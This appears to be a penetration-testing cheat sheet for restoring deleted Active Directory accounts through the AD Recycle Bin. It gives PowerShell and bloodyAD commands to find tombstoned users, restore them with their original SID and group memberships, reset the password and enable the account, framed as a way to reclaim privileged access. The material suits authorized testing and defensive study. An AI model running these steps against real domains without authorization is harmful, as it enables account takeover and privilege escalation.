# Recycle Bin Restore

AD Recycle Bin lets you restore tombstoned objects with their original SID and group memberships intact. Useful for re-animating privileged accounts that an admin "deleted" but left in the Deleted Objects container. Requires AD Recycle Bin to be enabled in the forest.

### Confirm Recycle Bin enabled

Check that the AD Recycle Bin optional feature is enabled. If not, you can't restore tombstoned objects.

```powershell title:"Recycle Bin Restore Check AD Recycle Bin optional feature is enabled"
Get-ADOptionalFeature 'Recycle Bin Feature'
```
<!-- cheat -->

### List deleted users

Search the Deleted Objects container for tombstoned user accounts.

```powershell title:"Recycle Bin Restore List tombstoned user objects in Deleted Objects container"
Get-ADObject -SearchBase "CN=Deleted Objects,$base_dn" -LDAPFilter "(objectClass=user)" -IncludeDeletedObjects -Properties objectSid,samAccountName,lastKnownParent,whenChanged
```
<!-- cheat
var base_dn
-->

### Find by samAccountName

Locate a specific tombstoned account by its old samAccountName.

```powershell title:"Recycle Bin Restore Find tombstoned object by samAccountName"
Get-ADObject -SearchBase "CN=Deleted Objects,$base_dn" -IncludeDeletedObjects -LDAPFilter "(samAccountName=$target_user)"
```
<!-- cheat
var base_dn
var target_user
-->

### Restore object

Restore the tombstoned object by GUID. Object comes back with original SID and group memberships, but the password is unset.

```powershell title:"Recycle Bin Restore Restore tombstoned object (SID + group memberships intact)"
Restore-ADObject -Identity $guid
```
<!-- cheat
var guid
-->

### Reset password

After restore, set a new password so you can authenticate as the resurrected account.

```powershell title:"Recycle Bin Restore Set new password on restored account"
Set-ADAccountPassword -Identity $target_user -Reset -NewPassword (ConvertTo-SecureString '$target_pass' -AsPlainText -Force)
```
<!-- cheat
var target_user
var target_pass
-->

### Enable account

The restored account starts disabled - enable it before auth.

```powershell title:"Recycle Bin Restore Enable the restored account"
Enable-ADAccount -Identity $target_user
```
<!-- cheat
var target_user
-->

### bloodyAD restore (Linux)

Same restore from Linux via bloodyAD. Kerberos auth is more reliable than NTLM for this operation.

```sh title:"Recycle Bin Restore Restore tombstoned object via bloodyAD (prefer Kerberos)"
bloodyAD --host $rhost_name -d $domain -u $user $auth_flags set restore $target_user
```
<!-- cheat
import domain_ip
import users
import bloody_auth
var rhost_name
var target_user
-->
